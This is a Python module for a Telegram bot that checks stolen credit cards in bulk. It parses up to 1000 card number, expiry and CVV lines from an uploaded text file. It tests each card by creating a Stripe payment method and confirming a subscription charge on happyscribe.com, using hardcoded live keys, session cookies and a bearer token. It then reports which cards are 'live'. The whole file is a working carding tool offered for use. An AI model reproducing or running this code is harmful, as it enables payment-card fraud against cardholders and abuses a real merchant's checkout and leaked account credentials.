import re
import requests
import time
import aiohttp
from pyrogram import Client, filters, enums
from EQUROBOT import app

# Function to extract credit card details from the file content
def extract_credit_card_details_from_file(file_content):
    cards = []
    lines = file_content.splitlines()
    for line in lines:
        input = re.findall(r"[0-9]+", line)
        if len(input) == 3:
            cc = input[0]
            if len(input[1]) == 3:
                mes = input[2][:2]
                ano = input[2][2:]
                cvv = input[1]
            else:
                mes = input[1][:2]
                ano = input[1][2:]
                cvv = input[2]
        elif len(input) == 4:
            cc, mes, ano, cvv = input
        else:
            continue

        if len(mes) != 2 or not (1 <= int(mes) <= 12):
            continue

        if len(cvv) not in [3, 4]:
            continue

        cards.append([cc, mes, ano, cvv])
        if len(cards) == 1000:
            break

    return cards

# Function to fetch BIN information
async def bin_lookup(bin_number):
    astroboyapi = f"https://astroboyapi.com/api/bin.php?bin={bin_number}"

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.get(astroboyapi) as response:
            if response.status == 200:
                try:
                    bin_info = await response.json()
                    brand = bin_info.get("brand", "N/A")
                    card_type = bin_info.get("type", "N/A")
                    level = bin_info.get("level", "N/A")
                    bank = bin_info.get("bank", "N/A")
                    country = bin_info.get("country_name", "N/A")
                    country_flag = bin_info.get("country_flag", "")
                    
                    bin_info_text = f"""
𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {country_flag}
"""
                    return bin_info_text
                except Exception as e:
                    return f"Error: Unable to retrieve BIN information ({str(e)})"
            else:
                return f"Error: Unable to retrieve BIN information (Status code: {response.status})"

# Function to process a single card
async def process_card(ccn, mm, yy, cvv):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=Hhg&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=91fbb521-dec9-4c76-8a30-db763fc485d44a83b0&muid=68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67&sid=8152f767-b5bf-4c00-a90e-81d5262832d6715ab4&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=32334&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response.raise_for_status()
        id = response.json().get('id')
    except requests.exceptions.RequestException as e:
        return None, f"Error during payment method creation: {str(e)}"

    cookies = {
        'ahoy_visitor': '1f532397-581b-4f95-a667-2370c55ae926',
        'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%2C%22consentId%22%3A%224fc44b3b-9d38-4f72-852a-a06b50b77292%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%7D',
        '_gcl_au': '1.1.1241378566.1716403581',
        'intercom-device-id-frdatdus': '2c5ddf8e-59c7-4199-9815-82245c5daeb3',
        'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVGswTnpNME5sMHNJbmszVldacFZHWmthRUZpU2tWUVpXaDJNMHd0SWl3aU1UY3hOalF3TXpZeU9TNHpOamt4TWpnaVhRPT0iLCJleHAiOiIyMDI0LTA1LTI5VDE4OjA3OjA5LjM2OVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--0df545370eb506f06655a31fd198d26fec6ca03b',
        'unsecure_is_signed_in': '1',
        '_cioid': '11947346',
        '__stripe_mid': '68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67',
        'ahoy_visit': '7fedd670-f9d6-4c54-a4ac-6c3fa2c5fc24',
        '_ga': 'GA1.2.1201600738.1716403570',
        '_gid': 'GA1.2.1234188292.1716777675',
        '_gat_UA-97995424-1': '1',
        'intercom-session-frdatdus': 'NFZEQjlKY0t1dUMyM2hwN0NqT2I3Rm5YWHVTY3BLaG9qb3JUeDJDTDhrcUdDNm1qRktzNERzMHNLcGt0V0VHVy0tQmlvbGtlYTlCZmF3WStqWHVXcXFxUT09--605b33f745246c869fa563efb6a366154020cbd2',
        '_ga_4T8KCV9Y2D': 'GS1.1.1716777674.4.1.1716777683.51.0.0',
        '__stripe_sid': '8152f767-b5bf-4c00-a90e-81d5262832d6715ab4',
        '_transcribe_session': 'gNnlLC1Wo2%2FGKDkUT%2B9eEHJvRM7pCSX62VbVti4ilnJ2vQEzmi1trInmJk9l0HLdFcsy5fVtsNL8C377Hf4pCF5c%2BEIy%2FHMRCIyZXdJxLZcEH%2BwRc2kzcC2WYShcsjvo1Imw79TpkzUTFwSm6uhyHWNSm4jJiI0TRZABJS5feV1yygELAGxiyuWVnjsgAxnou99uLIpO4NSJbB87AF1NY1rry9qLVR6BGFAKw1AZZL2uEn%2FzD%2FY3iXtZMilLYddXZ%2B8KcHSvof0J6wVAkfo8z5bA3khEu8lS26Py0QoB%2BMVX7EXOb%2B3fsnBVVf9O4PFuY63qSumhWo8JYj5blj31O51Z%2BhAtS9FAby6RValiK8DD9YoUtsJDfWdnAIbGi%2BNxdLoJl8qxwn9THj5NZDY2sUHgYg%3D%3D--gt4ad5nhsiL4XeD6--8kcGD5T7tOu0yRDtheQbsw%3D%3D',
    }

    headers = {
        'authority': 'www.happyscribe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer EsVfB1j947HZeJUWaD718Qtt',
        'content-type': 'application/json',
        'origin': 'https://www.happyscribe.com',
        'referer': 'https://www.happyscribe.com/v2/11453735/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'id': 11132807,
        'address': 'Eee',
        'name': 'Hhg',
        'country': 'US',
        'vat': None,
        'billing_account_id': 11132807,
        'last4': '6650',
        'orderReference': 'zmemwaft',
        'user_id': 11947346,
        'organization_id': 11453735,
        'hours': 0,
        'balance_increase_in_cents': None,
        'payment_method_id': id,
        'transcription_id': None,
        'plan': 'basic_2023_05_01',
        'order_id': None,
        'recurrence_interval': 'month',
        'extra_plan_hours': None,
    }

    try:
        response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()
        msg = response.json().get('error', '')
    except requests.exceptions.RequestException as e:
        return None, f"Error during payment confirmation: {str(e)}"

    P = f"{ccn}|{mm}|{yy}|{cvv}"

    if "card has insufficient funds" in msg:
        return P, f'''
┏━━━━━━━⍟
┃STRIPE AUTH 𝟓$ ✅
┗━━━━━━━━━━━⊛
➩ 𝗖𝗮𝗿𝗱 :`{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CVV CHARGE ✅

⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
        '''
    elif "security code or expiration date is incorrect" in msg or "Your card's security code is incorrect." in msg:
        return None, f'''
┏━━━━━━━⍟
┃STRIPE AUTH 𝟓$ ✅
┗━━━━━━━━━━━⊛
➩ 𝗖𝗮𝗿𝗱 :`{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CARD ISSUE CVV DECLINE❎

⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
        '''
    else:
        return None, f'''
┏━━━━━━━⍟
┃DECLINED ❌
┗━━━━━━━━━━━⊛      
➩ 𝗖𝗮𝗿𝗱 ➜ `{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : DEAD ❌

⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
        '''

# Command to check credit card details from a TXT file
@app.on_message(filters.command("cvvtxt", prefixes=[".", "/"]))
async def check_cc_from_file(client, message):
    if not message.reply_to_message or not message.reply_to_message.document:
        return await message.reply_text("Please reply to a .TXT file with the command.")
    
    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        return await message.reply_text("Please provide a .TXT file.")
    
    file_path = await client.download_media(document)
    
    with open(file_path, "r") as file:
        file_content = file.read()
    
    cards = extract_credit_card_details_from_file(file_content)
    
    if not cards:
        return await message.reply_text('No valid CC details found in the file or file is empty.')

    total_cc_input = len(cards)
    charged = 0
    live = 0
    dead = 0
    total_checked = 0

    reply = await message.reply_text('Processing your request...')

    results = []
    for card in cards:
        ccn, mm, yy, cvv = card

        if not (len(ccn) in [13, 15, 16] and len(mm) == 2 and len(yy) in [2, 4] and len(cvv) in [3, 4]):
            continue

        total_checked += 1
        result, msg = await process_card(ccn, mm, yy, cvv)
        if result:
            live += 1
            results.append(msg)
        else:
            dead += 1

        charged += 1

    status = f'''
⊗ 𝐆𝐚𝐭𝐞𝐬: 1$ CVV

⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐂 𝐈𝐧𝐩𝐮𝐭: {total_cc_input}
⊗ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {charged}
⊗ 𝐋𝐢𝐯𝐞: {live}
⊗ 𝐃𝐞𝐚𝐝: {dead}
⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {total_checked}
⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: Completed

⊗ 𝐓𝐢𝐦𝐞: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {message.from_user.first_name}
'''

    await message.reply_text(status)
    if live > 0:
        await message.reply_text('\n\n'.join(results))
    await reply.delete()
      
